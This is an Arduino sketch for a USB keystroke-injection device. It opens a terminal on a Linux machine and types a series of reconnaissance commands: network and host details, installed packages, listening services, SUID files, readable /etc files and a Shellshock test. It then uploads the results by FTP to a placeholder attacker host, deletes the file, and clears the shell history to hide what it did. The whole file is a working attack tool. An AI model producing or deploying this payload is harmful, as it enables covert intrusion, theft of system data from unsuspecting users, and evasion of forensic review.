#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press("t");
  Keyboard.releaseAll();

  delay(1500);
  Keyboard.print(F("clear"));

  delay(10);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Logged in user: \" $USER > info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("cat /etc/issue | cut -c1-13 >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo -n \"uname results: \" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("uname -a >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("echo >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Shellsock Bug Vulnerability: \" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Mounted filesystems: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("mount -l >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Network Configuration: \" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("ifconfig -a | grep 'Link\\|inet' >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Print Hosts: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("cat /etc/hosts >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Print ARP: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("arp >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Development tools availability: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("which gcc >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("which g++ >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("which python >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Print TCP/UDP Listening Services: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("netstat -tunlpe >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Installed Packages: \" >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("dpkg -l >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Find Readable Folders in /etc: \" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("echo >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("echo \"Find SUID and GUID files\" >> info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt"));

  delay(50);
  typeKey(KEY_RETURN);

  delay(15000);
  Keyboard.print(F("ftp -i <ftpip>"));

  typeKey(KEY_RETURN);

  delay(1200);
  Keyboard.print(F("<ftpuname>"));

  delay(70);
  typeKey(KEY_RETURN);
  
  delay(1200);
  Keyboard.print(F("<ftppass>"));

  delay(70);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("put info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(3000);
  Keyboard.print(F("bye"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("rm -rf info_gathering.txt"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("cat /dev/null > ~/.bash_history && history -c && exit"));

  delay(50);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
